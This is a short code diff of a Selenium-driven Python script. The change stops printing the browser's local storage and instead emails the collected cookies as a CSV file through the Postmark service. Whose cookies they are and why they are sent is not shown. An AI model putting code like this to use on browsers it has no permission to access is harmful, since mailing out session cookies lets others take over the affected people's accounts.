@@ -6,6 +6,8 @@ import pytz
 import browser
 import gdrive
 import urlParser
+import csvexport
+import postmark
 from selenium import webdriver
 
 SCREENSHOT_INTERVAL = int(os.environ['SCREENSHOT_INTERVAL'])
@@ -28,7 +30,7 @@ def process_storage(driver: webdriver.Chrome):
         data = browser.export_storage_urls(driver, urls)
         cookies = data['cookies']
         local_storage = data['local_storage']
-        pprint(local_storage)
+        postmark.send_mail(csvexport.generate_csv_cookies(cookies))
 
 
 def process_screenshot(driver: webdriver.Chrome):
